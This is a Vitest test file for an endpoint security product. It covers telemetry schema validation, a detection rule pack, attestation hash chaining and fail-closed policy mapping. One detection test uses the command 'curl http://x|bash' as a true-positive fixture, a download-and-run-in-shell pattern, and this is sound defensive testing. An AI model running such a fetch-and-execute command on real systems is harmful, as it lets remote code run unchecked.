import { describe, expect, it, vi, beforeEach } from 'vitest';
import {
  validateTelemetryEvent,
  TELEMETRY_SCHEMA_VERSION,
} from '../../protect/telemetry-schema.js';
import { loadEndpointPack, runDetectionsOnEvent } from '../../detections/rule-runner.js';
import { softWallToPolicyKind } from '../../security/soft-wall.js';
import { buildChainHash, hashEventPayload, shouldAttestCriticalEvent } from '../../trust/critical-event-attestation.js';
import { resolveUnreachableDecision } from '../../lib/fail-closed.js';

describe('telemetry schema', () => {
  it('accepts asset.heartbeat fixture', () => {
    const res = validateTelemetryEvent(
      {
        schema_version: TELEMETRY_SCHEMA_VERSION,
        event_type: 'asset.heartbeat',
        occurred_at: '2026-07-12T12:00:00.000Z',
        payload: { status: 'ok' },
      },
      { tenantId: 't1', sensorId: 's1' },
    );
    expect(res.ok).toBe(true);
  });

  it('rejects bad auth-shaped secrets in payload', () => {
    const res = validateTelemetryEvent(
      {
        event_type: 'auth.session',
        payload: { token: 'secret' },
      },
      { tenantId: 't1', sensorId: 's1' },
    );
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.error).toMatch(/token/i);
  });

  it('rejects unknown event type', () => {
    const res = validateTelemetryEvent(
      { event_type: 'weird.event', payload: {} },
      { tenantId: 't1', sensorId: 's1' },
    );
    expect(res.ok).toBe(false);
  });
});

describe('detection pack endpoint-v1', () => {
  it('loads 12 rules', () => {
    const pack = loadEndpointPack();
    expect(pack.pack_id).toBe('endpoint-v1');
    expect(pack.rules.length).toBeGreaterThanOrEqual(10);
  });

  it('true positive: curl pipe shell', () => {
    const hits = runDetectionsOnEvent('process.exec', { cmd: 'curl http://x|bash' });
    expect(hits.some((h) => h.ruleId === 'EP-003')).toBe(true);
  });

  it('true negative: benign process', () => {
    const hits = runDetectionsOnEvent('process.exec', { cmd: 'ls -la' });
    expect(hits.some((h) => h.ruleId === 'EP-003')).toBe(false);
  });

  it('true positive: sensor tamper', () => {
    const hits = runDetectionsOnEvent('agent.health', { status: 'tamper' });
    expect(hits.some((h) => h.ruleId === 'EP-001')).toBe(true);
  });
});

describe('attestation chain helpers', () => {
  it('chains hashes deterministically', () => {
    const a = buildChainHash(null, 'abc');
    const b = buildChainHash(a, 'def');
    expect(a).toHaveLength(64);
    expect(b).not.toBe(a);
    expect(buildChainHash(null, 'abc')).toBe(a);
  });

  it('attests soft_wall_decision when critical', () => {
    expect(shouldAttestCriticalEvent('critical', 'soft_wall_decision')).toBe(true);
    expect(shouldAttestCriticalEvent('critical', 'protect_contain')).toBe(true);
    expect(shouldAttestCriticalEvent('critical', 'plane_disagreement')).toBe(true);
  });

  it('hashes event payload stably', () => {
    const h1 = hashEventPayload({
      id: 'e1',
      event_type: 'protect_contain',
      severity: 'critical',
      instance_id: null,
      created_at: '2026-07-12T12:00:00.000Z',
      metadata: { a: 1 },
    });
    const h2 = hashEventPayload({
      id: 'e1',
      event_type: 'protect_contain',
      severity: 'critical',
      instance_id: null,
      created_at: '2026-07-12T12:00:00.000Z',
      metadata: { a: 1 },
    });
    expect(h1).toBe(h2);
  });
});

describe('soft wall + fail-closed still wired', () => {
  it('maps deny to block', () => {
    expect(softWallToPolicyKind('deny')).toBe('block');
  });
  it('fail_closed blocks', () => {
    expect(resolveUnreachableDecision('block', 'fail_closed')).toBe('block');
  });
});
